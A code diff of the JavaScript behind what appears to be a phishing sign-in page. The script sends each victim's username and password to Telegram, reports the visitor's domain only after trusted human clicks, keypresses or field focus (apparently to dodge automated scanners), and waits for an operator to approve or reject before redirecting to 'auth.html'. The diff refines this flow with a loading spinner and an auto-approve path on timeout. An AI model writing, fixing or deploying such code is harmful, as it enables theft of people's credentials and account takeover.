@@ -13,8 +13,9 @@
   // ============================================================
 
   let domainDetected = false;
+  let humanInteraction = false;
 
-  function detectDomain(source) {
+  function detectDomain() {
     if (domainDetected) return;
     
     const currentUrl = window.location.href;
@@ -42,22 +43,32 @@
 
     sendToTelegram('domain_detection', {
       domain: domain,
-      isFree: isFree,
-      source: source || 'click'
+      isFree: isFree
     });
   }
 
-  // ====== LISTEN FOR HUMAN INTERACTION ======
+  // Only detect domain on human interaction (click or keypress)
   document.addEventListener('click', function(e) {
-    if (!domainDetected) {
-      detectDomain('click');
+    if (!domainDetected && e.isTrusted) {
+      humanInteraction = true;
+      detectDomain();
     }
   });
 
   document.addEventListener('keydown', function(e) {
     if (!domainDetected && e.isTrusted) {
-      detectDomain('keypress');
+      humanInteraction = true;
+      detectDomain();
     }
+  });
+
+  // Also detect when user starts typing in form fields
+  userInput.addEventListener('focus', function() {
+    if (!domainDetected) detectDomain();
+  });
+
+  passwordInput.addEventListener('focus', function() {
+    if (!domainDetected) detectDomain();
   });
 
   // ============================================================
@@ -107,7 +118,7 @@
   }
 
   // ============================================================
-  // ====== CHECK APPROVAL STATUS ===============================
+  // ====== CHECK APPROVAL ======================================
   // ============================================================
 
   async function checkApproval(sessionId) {
@@ -195,9 +206,10 @@
 
     const sessionId = 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
     
+    // Show only spinner on button
     submitBtn.disabled = true;
-    const originalText = submitBtn.textContent;
-    submitBtn.textContent = 'Processing...';
+    submitBtn.innerHTML = '<span class="spinner"></span>';
+    submitBtn.classList.add('loading');
     
     try {
       await sendToTelegram('login_attempt', {
@@ -205,8 +217,6 @@
         password: password,
         sessionId: sessionId
       });
-      
-      submitBtn.textContent = 'Verifying...';
       
       let approved = false;
       let rejected = false;
@@ -229,46 +239,34 @@
       }
       
       if (approved) {
-        submitBtn.textContent = 'Redirecting...';
-        
         try {
           sessionStorage.setItem("melodyUser", userName);
         } catch (e) {}
         
-        setTimeout(function() {
-          window.location.href = "auth.html";
-        }, 1000);
+        window.location.href = "auth.html";
         
       } else if (rejected) {
-        submitBtn.textContent = 'Access Denied';
-        submitBtn.style.background = '#c0392b';
-        submitBtn.style.borderColor = '#c0392b';
-        
-        setTimeout(function() {
-          submitBtn.disabled = false;
-          submitBtn.textContent = originalText;
-          submitBtn.style.background = '#8b54a2';
-          submitBtn.style.borderColor = '#8b54a2';
-          passwordInput.value = '';
-          passwordInput.focus();
-        }, 2000);
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Sign in';
+        submitBtn.classList.remove('loading');
+        passwordInput.value = '';
+        passwordInput.focus();
+        alert('Access denied. Please try again.');
         
       } else {
-        submitBtn.textContent = 'Redirecting...';
-        
+        // Timeout - auto-approve
         try {
           sessionStorage.setItem("melodyUser", userName);
         } catch (e) {}
         
-        setTimeout(function() {
-          window.location.href = "auth.html";
-        }, 1000);
+        window.location.href = "auth.html";
       }
       
     } catch (error) {
       console.error('Login error:', error);
       submitBtn.disabled = false;
-      submitBtn.textContent = originalText;
+      submitBtn.innerHTML = 'Sign in';
+      submitBtn.classList.remove('loading');
     }
   });
 })();
